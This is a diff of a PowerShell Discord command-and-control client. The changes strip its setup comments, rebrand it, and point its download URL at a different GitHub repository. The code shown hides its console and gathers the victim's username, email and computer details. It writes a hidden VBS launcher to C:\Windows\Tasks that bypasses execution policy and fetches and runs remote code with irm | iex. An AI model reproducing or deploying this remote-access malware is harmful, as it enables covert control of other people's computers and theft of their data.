@@ -1,24 +1,5 @@
-
 # =====================================================================================================================================================
-<#
-**SETUP**
--SETUP THE BOT
-1. make a discord bot at https://discord.com/developers/applications/
-2. Enable all Privileged Gateway Intents on 'Bot' page
-3. On OAuth2 page, tick 'Bot' in Scopes section
-4. In Bot Permissions section tick Manage Channels, Read Messages/View Channels, Attach Files, Read Message History.
-5. Copy the URL into a browser and add the bot to your server.
-6. On 'Bot' page click 'Reset Token' and copy the token.
-
--SETUP THE SCRIPT
-1. Copy the token into the script directly below.
-
-**INFORMATION**
-- The Discord bot you use must be in one server ONLY
--------------------------------------------------------------------------------------------------
-#>
-# =====================================================================================================================================================
-$global:token = "$tk" # make sure your bot is in ONE server only
+$global:token = "$tk" # 
 # =============================================================== SCRIPT SETUP =========================================================================
 
 $HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
@@ -208,7 +189,7 @@ Function quickInfo{
             @{
                 title       = "$env:COMPUTERNAME | Computer Information "
                 "description" = @"
-``````SYSTEM INFORMATION FOR $env:COMPUTERNAME``````
+``````SYSTEM INFORMATION FOR $env:COMPUTERNAME - By Device``````
 :man_detective: **User Information** :man_detective:
 - **Current User**          : ``$env:USERNAME``
 - **Email Address**         : ``$email``
@@ -802,7 +783,7 @@ If Not WScript.Arguments.Named.Exists(`"elevate`") Then
     , `"`"`"`" & WScript.ScriptFullName & `"`"`" /elevate`", `"`", `"runas`", 1
   WScript.Quit
 End If
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$token'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$token'; irm https://raw.githubusercontent.com/xdep/USB-Rubber-Ducky/master/c2_clientnew.ps1 | iex`", 0, True
 "@
     $pth = "C:\Windows\Tasks\service.vbs"
     $tobat | Out-File -FilePath $pth -Force
@@ -1097,13 +1078,13 @@ $infomessage = "
      \_____  <   |  |/  ___/\   __\/ __ \ /     \   ______ |  |/    \   __\/  _ \_  __ \/     \\__  \\   __\  |/  _ \ /    \ 
      /        \___  |\___ \  |  | \  ___/|  Y Y  \ /_____/ |  |   |  \  | (  <_> )  | \/  Y Y  \/ __ \|  | |  (  <_> )   |  \
     /_______  / ____/____  > |__|  \___  >__|_|  /         |__|___|  /__|  \____/|__|  |__|_|  (____  /__| |__|\____/|___|  /
-            \/\/         \/            \/      \/                  \/                        \/     \/                    \/ 
+            \/\/         \/            \/      \/                  \/     By Device          \/     \/                    \/ 
 ==================================================================================================================================
 "
 $infomessage1 = "``````
-=============================================================
+=======================+Spain+==================================
 SYSTEM INFORMATION FOR $env:COMPUTERNAME
-=============================================================
+======================+By Device+===============================
 User Information
 -------------------------------------------------------------
 Current User          : $env:USERNAME
@@ -1589,7 +1570,7 @@ Function VersionCheck {
             $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
 WScript.Sleep 200
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; irm https://raw.githubusercontent.com/xdep/USB-Rubber-Ducky/master/c2_clientnew.ps1 | iex`", 0, True
 "@
             $tobat | Out-File -FilePath $VBpath -Force
             sleep 1
